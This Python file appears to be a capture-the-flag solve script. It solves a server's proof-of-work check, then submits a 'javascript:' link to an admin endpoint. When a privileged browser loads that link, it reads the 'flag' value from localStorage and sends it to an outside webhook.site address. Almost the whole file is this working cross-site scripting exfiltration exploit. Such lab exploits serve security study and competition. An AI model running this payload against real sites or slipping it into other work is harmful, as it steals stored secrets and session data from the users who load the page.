import requests

import hashlib
import uuid
import binascii
import os
import sys


def generate():
    return uuid.uuid4().hex[:4], uuid.uuid4().hex[:4]


def verify(prefix, suffix, answer, difficulty=6):
    hash = hashlib.sha256(
        prefix.encode() + answer.encode() + suffix.encode()).hexdigest()
    return hash.endswith("0"*difficulty)


def solve(prefix, suffix, difficulty):
    while True:
        test = binascii.hexlify(os.urandom(4)).decode()
        if verify(prefix, suffix, test, difficulty):
            return test


if len(sys.argv) < 2:
    print("Usage: solve.py http://host:port/")
    exit()
s = requests.Session()
host = sys.argv[1]
data = s.get(host + "pow").json()
print(f"Solving POW - session_id: {s.cookies.get_dict()}")
solution = solve(data['pref'], data['suff'], 5)
print(f"Solved: {solution}")
s.post(host + "pow", json={"answer": solution})

# SEND PAYLOAD
res = s.get(host+"admin", params={"title": "title",
            "link": "javascript:fetch('https://webhook.site/bb646686-d133-4550-80e6-a373a78b7c93/?flag=1'%2blocalStorage.getItem('flag'),{mode:'no-cors'})"})
print(res)
